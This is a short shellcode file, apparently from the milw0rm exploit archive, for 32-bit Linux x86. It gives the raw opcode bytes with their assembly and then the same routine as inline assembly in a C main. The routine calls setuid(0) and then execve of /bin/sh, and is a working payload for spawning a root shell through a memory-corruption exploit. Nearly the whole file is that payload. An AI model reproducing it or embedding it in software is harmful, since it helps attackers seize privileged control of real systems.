/*
s0t4ipv6@shellcode.com.ar
20 de marzo de 2001


"\x31\xdb"                      // xorl         %ebx,%ebx
"\x8d\x43\x17"                  // leal         0x17(%ebx),%eax
"\xcd\x80"                      // int          $0x80
"\x31\xd2"                      // xorl         %edx,%edx
"\x52"                          // pushl        %edx
"\x68\x6e\x2f\x73\x68"          // pushl        $0x68732f6e
"\x68\x2f\x2f\x62\x69"          // pushl        $0x69622f2f
"\x89\xe3"                      // movl         %esp,%ebx
"\x52"                          // pushl        %edx
"\x53"                          // pushl        %ebx
"\x89\xe1"                      // movl         %esp,%ecx
"\xb0\x0b"                      // movb         $0xb,%al
"\xcd\x80";                     // int          $0x80

*/

void main() {
__asm__ ("
	xorl	%ebx, %ebx
	leal	0x17(%ebx),%eax
	int	$0x80				# here was cleared eax

	xorl	%edx, %edx
	pushl	%edx
	pushl	$0x68732f6e
	pushl	$0x69622f2f
	movl	%esp, %ebx
	pushl	%edx
	pushl	%ebx
	movl	%esp, %ecx
	movb	$0xb, %al			# and makeuof here
	int	$0x80
	");
}

// milw0rm.com [2004-09-12]